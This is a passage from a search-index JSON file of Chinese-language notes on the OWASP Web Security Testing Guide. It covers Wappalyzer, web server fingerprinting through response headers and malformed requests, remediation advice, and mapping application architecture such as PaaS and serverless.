\u8f93\u51fa\u793a\u4f8b</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#wappalyzer","title":"Wappalyzer","text":"<p>\u7f51\u7ad9\uff1ahttps ://www.wappalyzer.com/</p> <p>Wappalyzer \u6709\u591a\u79cd\u4f7f\u7528\u6a21\u5f0f\uff0c\u5176\u4e2d\u6700\u6d41\u884c\u7684\u53ef\u80fd\u662f Firefox/Chrome \u6269\u5c55\u3002\u5b83\u4eec\u4ec5\u9002\u7528\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\uff0c\u9664\u4e86\u8981\u5728\u6d4f\u89c8\u5668\u4e2d\u52a0\u8f7d\u7684\u9875\u9762\u5916\uff0c\u4e0d\u9700\u8981\u4efb\u4f55\u5176\u4ed6\u5185\u5bb9\u3002\u5b83\u5b8c\u5168\u5728\u6d4f\u89c8\u5668\u7ea7\u522b\u5de5\u4f5c\uff0c\u5e76\u4ee5\u56fe\u6807\u7684\u5f62\u5f0f\u7ed9\u51fa\u7ed3\u679c\u3002\u867d\u7136\u6709\u65f6\u5b83\u4f1a\u51fa\u73b0\u8bef\u62a5\uff0c\u4f46\u5728\u6d4f\u89c8\u9875\u9762\u540e\u7acb\u5373\u4e86\u89e3\u4f7f\u7528\u4e86\u54ea\u4e9b\u6280\u672f\u6765\u6784\u5efa\u76ee\u6807\u7f51\u7ad9\u975e\u5e38\u65b9\u4fbf\u3002</p> <p>\u4e0b\u9762\u7684\u5c4f\u5e55\u622a\u56fe\u663e\u793a\u4e86\u63d2\u4ef6\u7684\u793a\u4f8b\u8f93\u51fa\u3002</p> <p> \u56fe 4.1.8-9\uff1aOWASP \u7f51\u7ad9\u7684 Wappalyzer \u8f93\u51fa</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_64","title":"\u53c2\u8003","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_65","title":"\u767d\u76ae\u4e66","text":"<ul> <li>Saumil Shah\uff1a\u201cHTTP \u6307\u7eb9\u8bc6\u522b\u7b80\u4ecb\u201d</li> <li>Anant Shrivastava\uff1a\u201c\u7f51\u7edc\u5e94\u7528\u6307\u7eb9\u8bc6\u522b\u201d</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#web_2","title":"WEB\u670d\u52a1\u5668\u6307\u7eb9\u8bc6\u522b","text":"<p>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_66","title":"\u6982\u62ec","text":"<p>Web \u670d\u52a1\u5668\u6307\u7eb9\u8bc6\u522b\u662f\u8bc6\u522b\u8fd0\u884c\u76ee\u6807\u7684 Web \u670d\u52a1\u5668\u7684\u7c7b\u578b\u548c\u7248\u672c\u7684\u4efb\u52a1\u3002\u867d\u7136 Web \u670d\u52a1\u5668\u6307\u7eb9\u901a\u5e38\u5c01\u88c5\u5728\u81ea\u52a8\u5316\u6d4b\u8bd5\u5de5\u5177\u4e2d\uff0c\u4f46\u5bf9\u4e8e\u7814\u7a76\u4eba\u5458\u6765\u8bf4\uff0c\u4e86\u89e3\u8fd9\u4e9b\u5de5\u5177\u5982\u4f55\u5c1d\u8bd5\u8bc6\u522b\u8f6f\u4ef6\u7684\u57fa\u672c\u539f\u7406\u53ca\u5176\u6709\u7528\u7684\u539f\u56e0\u975e\u5e38\u91cd\u8981\u3002</p> <p>\u51c6\u786e\u5730\u53d1\u73b0\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\u7684 Web \u670d\u52a1\u5668\u7684\u7c7b\u578b\u53ef\u4ee5\u4f7f\u5b89\u5168\u6d4b\u8bd5\u4eba\u5458\u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u662f\u5426\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u3002\u7279\u522b\u662f\uff0c\u8fd0\u884c\u6ca1\u6709\u6700\u65b0\u5b89\u5168\u8865\u4e01\u7684\u65e7\u7248\u672c\u8f6f\u4ef6\u7684\u670d\u52a1\u5668\u53ef\u80fd\u5bb9\u6613\u53d7\u5230\u5df2\u77e5\u7248\u672c\u7279\u5b9a\u6f0f\u6d1e\u7684\u653b\u51fb\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_67","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u786e\u5b9a\u6b63\u5728\u8fd0\u884c\u7684 Web \u670d\u52a1\u5668\u7684\u7248\u672c\u548c\u7c7b\u578b\uff0c\u4ee5\u4fbf\u8fdb\u4e00\u6b65\u53d1\u73b0\u4efb\u4f55\u5df2\u77e5\u6f0f\u6d1e\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_68","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u7528\u4e8e Web \u670d\u52a1\u5668\u6307\u7eb9\u8bc6\u522b\u7684\u6280\u672f\u5305\u62ecbanner\u6293\u53d6\u3001\u5f15\u53d1\u5bf9\u683c\u5f0f\u9519\u8bef\u7684\u8bf7\u6c42\u7684\u54cd\u5e94\uff0c\u4ee5\u53ca\u4f7f\u7528\u81ea\u52a8\u5316\u5de5\u5177\u6267\u884c\u4f7f\u7528\u7b56\u7565\u7ec4\u5408\u7684\u66f4\u5f3a\u5927\u7684\u626b\u63cf\u3002\u6240\u6709\u8fd9\u4e9b\u6280\u672f\u8fd0\u4f5c\u7684\u57fa\u672c\u524d\u63d0\u662f\u76f8\u540c\u7684\u3002\u4ed6\u4eec\u90fd\u52aa\u529b\u4ece Web \u670d\u52a1\u5668\u4e2d\u5f15\u51fa\u4e00\u4e9b\u54cd\u5e94\uff0c\u7136\u540e\u53ef\u4ee5\u5c06\u8fd9\u4e9b\u54cd\u5e94\u4e0e\u5df2\u77e5\u54cd\u5e94\u548c\u884c\u4e3a\u7684\u6570\u636e\u5e93\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ece\u800c\u4e0e\u5df2\u77e5\u7684\u670d\u52a1\u5668\u7c7b\u578b\u76f8\u5339\u914d\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#banner","title":"banner \u6293\u53d6","text":"<p>banner\u6293\u53d6\u662f\u901a\u8fc7\u5411 Web \u670d\u52a1\u5668\u53d1\u9001 HTTP \u8bf7\u6c42\u5e76\u68c0\u67e5\u5176\u54cd\u5e94\u6807\u5934\u6765\u6267\u884c\u7684\u3002\u8fd9\u53ef\u4ee5\u4f7f\u7528\u5404\u79cd\u5de5\u5177\u6765\u5b8c\u6210\uff0c\u5305\u62ec<code>telnet</code>HTTP \u8bf7\u6c42\u6216<code>openssl</code>\u901a\u8fc7 TLS/SSL \u7684\u8bf7\u6c42\u3002</p> <p>\u4f8b\u5982\uff0c\u8fd9\u662f\u5bf9\u6765\u81ea Apache \u670d\u52a1\u5668\u7684\u8bf7\u6c42\u7684\u54cd\u5e94\u3002</p> <pre><code>HTTP/1.1 200 OK\nDate: Thu, 05 Sep 2019 17:42:39 GMT\nServer: Apache/2.4.41 (Unix)\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nETag: \"75-591d1d21b6167\"\nAccept-Ranges: bytes\nContent-Length: 117\nConnection: close\nContent-Type: text/html\n...\n</code></pre> <p>\u8fd9\u662f\u53e6\u4e00\u4e2a\u54cd\u5e94\uff0c\u8fd9\u6b21\u6765\u81ea nginx\u3002</p> <pre><code>HTTP/1.1 200 OK\nServer: nginx/1.17.3\nDate: Thu, 05 Sep 2019 17:50:24 GMT\nContent-Type: text/html\nContent-Length: 117\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nConnection: close\nETag: \"5d71489a-75\"\nAccept-Ranges: bytes\n...\n</code></pre> <p>\u8fd9\u662f\u6765\u81ea lighttpd \u7684\u54cd\u5e94\u3002</p> <pre><code>HTTP/1.0 200 OK\nContent-Type: text/html\nAccept-Ranges: bytes\nETag: \"4192788355\"\nLast-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nContent-Length: 117\nConnection: close\nDate: Thu, 05 Sep 2019 17:57:57 GMT\nServer: lighttpd/1.4.54\n</code></pre> <p>\u5728\u8fd9\u4e9b\u4f8b\u5b50\u4e2d\uff0c\u670d\u52a1\u5668\u7c7b\u578b\u548c\u7248\u672c\u88ab\u6e05\u695a\u5730\u66b4\u9732\u4e86\u3002\u4f46\u662f\uff0c\u6ce8\u91cd\u5b89\u5168\u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u901a\u8fc7\u4fee\u6539\u6807\u5934\u6765\u6df7\u6dc6\u5176\u670d\u52a1\u5668\u4fe1\u606f\u3002\u4f8b\u5982\uff0c\u4ee5\u4e0b\u662f\u5bf9\u5177\u6709\u4fee\u6539\u6807\u5934\u7684\u7ad9\u70b9\u8bf7\u6c42\u7684\u54cd\u5e94\u7684\u6458\u5f55\uff1a</p> <pre><code>HTTP/1.1 200 OK\nServer: Website.com\nDate: Thu, 05 Sep 2019 17:57:06 GMT\nContent-Type: text/html; charset=utf-8\nStatus: 200 OK\n...\n</code></pre> <p>\u5728\u670d\u52a1\u5668\u4fe1\u606f\u6a21\u7cca\u4e0d\u6e05\u7684\u60c5\u51b5\u4e0b\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4f1a\u6839\u636e\u6807\u5934\u5b57\u6bb5\u7684\u987a\u5e8f\u731c\u6d4b\u670d\u52a1\u5668\u7684\u7c7b\u578b\u3002\u8bf7\u6ce8\u610f\uff0c\u5728\u4e0a\u9762\u7684 Apache \u793a\u4f8b\u4e2d\uff0c\u5b57\u6bb5\u9075\u5faa\u4ee5\u4e0b\u987a\u5e8f\uff1a</p> <ul> <li>\u65e5\u671f</li> <li>\u670d\u52a1\u5668</li> <li>\u6700\u540e\u4fee\u6539</li> <li>\u7535\u5b50\u6807\u7b7e</li> <li>\u63a5\u53d7\u8303\u56f4</li> <li>\u5185\u5bb9\u957f\u5ea6</li> <li>\u8054\u7cfb</li> <li>\u5185\u5bb9\u7c7b\u578b</li> </ul> <p>\u4f46\u662f\uff0c\u5728 nginx \u548c\u6a21\u7cca\u670d\u52a1\u5668\u793a\u4f8b\u4e2d\uff0c\u5171\u540c\u7684\u5b57\u6bb5\u90fd\u9075\u5faa\u4ee5\u4e0b\u987a\u5e8f\uff1a</p> <ul> <li>\u670d\u52a1\u5668</li> <li>\u65e5\u671f</li> <li>\u5185\u5bb9\u7c7b\u578b</li> </ul> <p>\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u6839\u636e\u8fd9\u4e9b\u4fe1\u606f\u731c\u6d4b\u88ab\u906e\u6321\u7684\u670d\u52a1\u5668\u662fnginx\u3002\u4f46\u662f\uff0c\u8003\u8651\u5230\u591a\u4e2a\u4e0d\u540c\u7684Web\u670d\u52a1\u5668\u53ef\u80fd\u5171\u4eab\u76f8\u540c\u7684\u5b57\u6bb5\u987a\u5e8f\u5e76\u4e14\u53ef\u4ee5\u4fee\u6539\u6216\u5220\u9664\u5b57\u6bb5\uff0c\u8fd9\u79cd\u65b9\u6cd5\u662f\u4e0d\u786e\u5b9a\u7684\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_69","title":"\u53d1\u9001\u683c\u5f0f\u9519\u8bef\u7684\u8bf7\u6c42","text":"<p>Web \u670d\u52a1\u5668\u53ef\u4ee5\u901a\u8fc7\u68c0\u67e5\u5b83\u4eec\u7684\u9519\u8bef\u54cd\u5e94\u6765\u8bc6\u522b\uff0c\u5e76\u4e14\u5728\u5b83\u4eec\u6ca1\u6709\u88ab\u5b9a\u5236\u7684\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u7684\u9ed8\u8ba4\u9519\u8bef\u9875\u9762\u3002\u5f3a\u5236\u670d\u52a1\u5668\u5448\u73b0\u8fd9\u4e9b\u5185\u5bb9\u7684\u4e00\u79cd\u65b9\u6cd5\u662f\u6545\u610f\u53d1\u9001\u4e0d\u6b63\u786e\u6216\u683c\u5f0f\u9519\u8bef\u7684\u8bf7\u6c42\u3002</p> <p>\u4f8b\u5982\uff0c\u8fd9\u662f\u5bf9<code>SANTA CLAUS</code>\u6765\u81ea Apache \u670d\u52a1\u5668\u7684\u4e0d\u5b58\u5728\u65b9\u6cd5\u7684\u8bf7\u6c42\u7684\u54cd\u5e94\u3002</p> <pre><code>GET / SANTA CLAUS/1.1\n\n\nHTTP/1.1 400 Bad Request\nDate: Fri, 06 Sep 2019 19:21:01 GMT\nServer: Apache/2.4.41 (Unix)\nContent-Length: 226\nConnection: close\nContent-Type: text/html; charset=iso-8859-1\n\n&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;\n&lt;html&gt;&lt;head&gt;\n&lt;title&gt;400 Bad Request&lt;/title&gt;\n&lt;/head&gt;&lt;body&gt;\n&lt;h1&gt;Bad Request&lt;/h1&gt;\n&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;\n&lt;/p&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre> <p>\u8fd9\u662f\u5bf9\u6765\u81ea nginx \u7684\u76f8\u540c\u8bf7\u6c42\u7684\u54cd\u5e94\u3002</p> <pre><code>GET / SANTA CLAUS/1.1\n\n\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;\n&lt;hr&gt;&lt;center&gt;nginx/1.17.3&lt;/center&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u8fd9\u662f\u5bf9\u6765\u81ea lighttpd \u7684\u76f8\u540c\u8bf7\u6c42\u7684\u54cd\u5e94\u3002</p> <pre><code>GET / SANTA CLAUS/1.1\n\n\nHTTP/1.0 400 Bad Request\nContent-Type: text/html\nContent-Length: 345\nConnection: close\nDate: Sun, 08 Sep 2019 21:56:17 GMT\nServer: lighttpd/1.4.54\n\n&lt;?xml version=\"1.0\" encoding=\"iso-8859-1\"?&gt;\n&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\n         \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"&gt;\n &lt;head&gt;\n  &lt;title&gt;400 Bad Request&lt;/title&gt;\n &lt;/head&gt;\n &lt;body&gt;\n  &lt;h1&gt;400 Bad Request&lt;/h1&gt;\n &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u7531\u4e8e\u9ed8\u8ba4\u9519\u8bef\u9875\u9762\u5728\u4e0d\u540c\u7c7b\u578b\u7684 Web \u670d\u52a1\u5668\u4e4b\u95f4\u63d0\u4f9b\u4e86\u8bb8\u591a\u533a\u5206\u56e0\u7d20\uff0c\u56e0\u6b64\u5373\u4f7f\u5728\u670d\u52a1\u5668\u6807\u5934\u5b57\u6bb5\u88ab\u906e\u76d6\u7684\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u7684\u68c0\u67e5\u4e5f\u53ef\u4ee5\u6210\u4e3a\u6307\u7eb9\u8bc6\u522b\u7684\u6709\u6548\u65b9\u6cd5\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_70","title":"\u4f7f\u7528\u81ea\u52a8\u626b\u63cf\u5de5\u5177","text":"<p>\u5982\u524d\u6240\u8ff0\uff0cWeb \u670d\u52a1\u5668\u6307\u7eb9\u8bc6\u522b\u901a\u5e38\u4f5c\u4e3a\u81ea\u52a8\u626b\u63cf\u5de5\u5177\u7684\u4e00\u9879\u529f\u80fd\u5305\u542b\u5728\u5185\u3002\u8fd9\u4e9b\u5de5\u5177\u80fd\u591f\u53d1\u51fa\u7c7b\u4f3c\u4e8e\u4e0a\u9762\u6f14\u793a\u7684\u8bf7\u6c42\uff0c\u4ee5\u53ca\u53d1\u9001\u5176\u4ed6\u66f4\u7279\u5b9a\u4e8e\u670d\u52a1\u5668\u7684\u63a2\u6d4b\u3002\u81ea\u52a8\u5316\u5de5\u5177\u53ef\u4ee5\u6bd4\u624b\u52a8\u6d4b\u8bd5\u66f4\u5feb\u5730\u6bd4\u8f83\u6765\u81ea Web \u670d\u52a1\u5668\u7684\u54cd\u5e94\uff0c\u5e76\u5229\u7528\u5df2\u77e5\u54cd\u5e94\u7684\u5927\u578b\u6570\u636e\u5e93\u6765\u5c1d\u8bd5\u8bc6\u522b\u670d\u52a1\u5668\u3002\u7531\u4e8e\u8fd9\u4e9b\u539f\u56e0\uff0c\u81ea\u52a8\u5316\u5de5\u5177\u66f4\u6709\u53ef\u80fd\u4ea7\u751f\u51c6\u786e\u7684\u7ed3\u679c\u3002</p> <p>\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5305\u542b Web \u670d\u52a1\u5668\u6307\u7eb9\u8bc6\u522b\u529f\u80fd\u7684\u5e38\u7528\u626b\u63cf\u5de5\u5177\u3002</p> <ul> <li>Netcraft\uff0c\u4e00\u79cd\u626b\u63cf\u7f51\u7ad9\u4fe1\u606f\uff08\u5305\u62ec\u7f51\u7edc\u670d\u52a1\u5668\uff09\u7684\u5728\u7ebf\u5de5\u5177\u3002</li> <li>Nikto\uff0c\u4e00\u79cd\u5f00\u6e90\u547d\u4ee4\u884c\u626b\u63cf\u5de5\u5177\u3002</li> <li>Nmap\uff0c\u4e00\u4e2a\u5f00\u6e90\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u4e5f\u6709\u4e00\u4e2a GUI\uff0cZenmap\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_71","title":"\u6574\u6cbb","text":"<p>\u867d\u7136\u66b4\u9732\u7684\u670d\u52a1\u5668\u4fe1\u606f\u672c\u8eab\u4e0d\u4e00\u5b9a\u662f\u6f0f\u6d1e\uff0c\u4f46\u5b83\u662f\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u5229\u7528\u53ef\u80fd\u5b58\u5728\u7684\u5176\u4ed6\u6f0f\u6d1e\u7684\u4fe1\u606f\u3002\u66b4\u9732\u7684\u670d\u52a1\u5668\u4fe1\u606f\u8fd8\u53ef\u80fd\u5bfc\u81f4\u653b\u51fb\u8005\u627e\u5230\u7279\u5b9a\u4e8e\u7248\u672c\u7684\u670d\u52a1\u5668\u6f0f\u6d1e\uff0c\u8fd9\u4e9b\u6f0f\u6d1e\u53ef\u7528\u4e8e\u5229\u7528\u672a\u6253\u8865\u4e01\u7684\u670d\u52a1\u5668\u3002\u56e0\u6b64\uff0c\u5efa\u8bae\u91c7\u53d6\u4e00\u4e9b\u9884\u9632\u63aa\u65bd\u3002\u8fd9\u4e9b\u884c\u52a8\u5305\u62ec\uff1a</p> <ul> <li>\u9690\u85cf\u6807\u5934\u4e2d\u7684 Web \u670d\u52a1\u5668\u4fe1\u606f\uff0c\u4f8b\u5982\u4f7f\u7528 Apache \u7684mod_headers \u6a21\u5757\u3002</li> <li>\u4f7f\u7528\u52a0\u56fa\u7684\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668\u5728 Web \u670d\u52a1\u5668\u548c Internet \u4e4b\u95f4\u521b\u5efa\u989d\u5916\u7684\u5b89\u5168\u5c42\u3002</li> <li>\u786e\u4fdd Web \u670d\u52a1\u5668\u4e0e\u6700\u65b0\u7684\u8f6f\u4ef6\u548c\u5b89\u5168\u8865\u4e01\u4fdd\u6301\u540c\u6b65\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#map","title":"MAP \u5e94\u7528\u6846\u67b6","text":"<p>\u7f51\u9875</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_72","title":"\u6982\u62ec","text":"<p>\u4e3a\u4e86\u6709\u6548\u5730\u6d4b\u8bd5\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u80fd\u591f\u5c31\u5982\u4f55\u89e3\u51b3\u4efb\u4f55\u5df2\u8bc6\u522b\u7684\u95ee\u9898\u63d0\u4f9b\u6709\u610f\u4e49\u7684\u5efa\u8bae\uff0c\u4e86\u89e3\u60a8\u5b9e\u9645\u6d4b\u8bd5\u7684\u5185\u5bb9\u975e\u5e38\u91cd\u8981\u3002\u6b64\u5916\uff0c\u5b83\u8fd8\u53ef\u4ee5\u5e2e\u52a9\u786e\u5b9a\u662f\u5426\u5e94\u5c06\u7279\u5b9a\u7ec4\u4ef6\u89c6\u4e3a\u8d85\u51fa\u6d4b\u8bd5\u8303\u56f4\u3002</p> <p>\u73b0\u4ee3 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u590d\u6742\u6027\u53ef\u80fd\u6709\u5f88\u5927\u5dee\u5f02\uff0c\u4ece\u5728\u5355\u4e2a\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u7684\u7b80\u5355\u811a\u672c\u5230\u8de8\u6570\u5341\u79cd\u4e0d\u540c\u7cfb\u7edf\u3001\u8bed\u8a00\u548c\u7ec4\u4ef6\u7684\u9ad8\u5ea6\u590d\u6742\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u8fd8\u53ef\u80fd\u6709\u989d\u5916\u7684\u7f51\u7edc\u7ea7\u7ec4\u4ef6\uff0c\u4f8b\u5982\u9632\u706b\u5899\u6216\u5165\u4fb5\u4fdd\u62a4\u7cfb\u7edf\uff0c\u5b83\u4eec\u4f1a\u5bf9\u6d4b\u8bd5\u4ea7\u751f\u91cd\u5927\u5f71\u54cd\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_73","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u67b6\u6784\u548c\u4f7f\u7528\u7684\u6280\u672f\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_74","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u4ece\u9ed1\u76d2\u89d2\u5ea6\u8fdb\u884c\u6d4b\u8bd5\u65f6\uff0c\u91cd\u8981\u7684\u662f\u8981\u5c1d\u8bd5\u6e05\u695a\u5730\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u7684\u5de5\u4f5c\u65b9\u5f0f\uff0c\u4ee5\u53ca\u91c7\u7528\u4e86\u54ea\u4e9b\u6280\u672f\u548c\u7ec4\u4ef6\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u6d4b\u8bd5\u7279\u5b9a\u7ec4\u4ef6\uff08\u4f8b\u5982 Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\uff09\uff0c\u800c\u5176\u4ed6\u60c5\u51b5\u5219\u53ef\u4ee5\u901a\u8fc7\u68c0\u67e5\u5e94\u7528\u7a0b\u5e8f\u7684\u884c\u4e3a\u6765\u8bc6\u522b\u3002</p> <p>\u4ee5\u4e0b\u90e8\u5206\u63d0\u4f9b\u4e86\u5bf9\u5e38\u89c1\u67b6\u6784\u7ec4\u4ef6\u7684\u9ad8\u7ea7\u6982\u8ff0\uff0c\u4ee5\u53ca\u5982\u4f55\u8bc6\u522b\u5b83\u4eec\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_75","title":"\u5e94\u7528\u7ec4\u4ef6","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_76","title":"\u7f51\u7edc\u670d\u52a1\u5668","text":"<p>\u7b80\u5355\u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u5728\u5355\u4e2a\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u7528\u6307\u5357\u7684\u6307\u7eb9 Web \u670d\u52a1\u5668\u90e8\u5206\u4e2d\u8ba8\u8bba\u7684\u6b65\u9aa4\u6765\u8bc6\u522b\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#paas","title":"\u5e73\u53f0\u5373\u670d\u52a1 (PaaS)","text":"<p>\u5728\u5e73\u53f0\u5373\u670d\u52a1 (PaaS) \u6a21\u578b\u4e2d\uff0cWeb \u670d\u52a1\u5668\u548c\u5e95\u5c42\u57fa\u7840\u8bbe\u65bd\u7531\u670d\u52a1\u63d0\u4f9b\u5546\u7ba1\u7406\uff0c\u5ba2\u6237\u53ea\u5bf9\u90e8\u7f72\u5728\u5176\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f\u8d1f\u8d23\u3002\u4ece\u6d4b\u8bd5\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u6709\u4e24\u4e2a\u4e3b\u8981\u533a\u522b\uff1a</p> <ul> <li>\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\u65e0\u6743\u8bbf\u95ee\u5e95\u5c42\u57fa\u7840\u8bbe\u65bd\uff0c\u56e0\u6b64\u65e0\u6cd5\u76f4\u63a5\u4fee\u590d\u4efb\u4f55\u95ee\u9898\u3002</li> <li>\u57fa\u7840\u8bbe\u65bd\u6d4b\u8bd5\u5f88\u53ef\u80fd\u8d85\u51fa\u4efb\u4f55\u9879\u76ee\u7684\u8303\u56f4\u3002</li> </ul> <p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u8bc6\u522b PaaS \u7684\u4f7f\u7528\uff0c\u56e0\u4e3a\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f7f\u7528\u7279\u5b9a\u7684\u57df\u540d\uff08\u4f8b\u5982\uff0c\u90e8\u7f72\u5728 Azure App Services \u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f\u5c06\u6709\u4e00\u4e2a<code>*.azurewebsites.net</code>\u57df\u2014\u2014\u5c3d\u7ba1\u5b83\u4eec\u4e5f\u53ef\u80fd\u4f7f\u7528\u81ea\u5b9a\u4e49\u57df\uff09\u3002\u4f46\u662f\uff0c\u5728\u5176\u4ed6\u60c5\u51b5\u4e0b\uff0c\u5f88\u96be\u786e\u5b9a\u662f\u5426\u6b63\u5728\u4f7f\u7528 PaaS\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/WEB%20Guide/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_77","title":"\u65e0\u670d\u52a1\u5668","text":"<p>\u5728\u65e0\u670d\u52a1\u5668\u6a21\u578b\u4e2d\uff0c\u5f00\u53d1\u4eba\u5458\u63d0\u4f9b\u76f4\u63a5\u5728\u6258\u7ba1\u5e73\u53f0\u4e0a\u4f5c\u4e3a\u72ec\u7acb\u529f\u80fd\u8fd0\u884c\u7684\u4ee3\u7801\uff0c\u800c\u4e0d\u662f\u4f5c\u4e3a\u90e8\u7f72\u5728 webroot \u4e2d\u7684\u4f20\u7edf\u5927\u578b Web \u5e94\u7528\u7a0b\u5e8f\u3002\u8fd9\u4f7f\u5f97\u5b83\u975e\u5e38\u9002\u5408\u57fa\u4e8e\u5fae\u670d\u52a1\u7684\u67b6\u6784\u3002\u4e0e PaaS \u73af\u5883\u4e00\u6837\uff0c\u57fa\u7840\u67b6\u6784\u6d4b\u8bd5\u53ef\u80fd\u8d85\u51fa\u8303\u56f4\u3002</p> <p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u80fd\u4f1a\u901a\u8fc7\u7279\u5b9a HTTP \u6807\u5934\u7684\u5b58\u5728\u6765\u6307\u793a\u65e0\u670d\u52a1\u5668\u4ee3\u7801\u7684\u4f7f\u7528\u3002\u4f8b\u5982\uff0cAWS Lambda \u51fd\u6570\u901a\u5e38\u4f1a\u8fd4\u56de\u4ee5\u4e0b\u6807\u5934\uff1a</p> 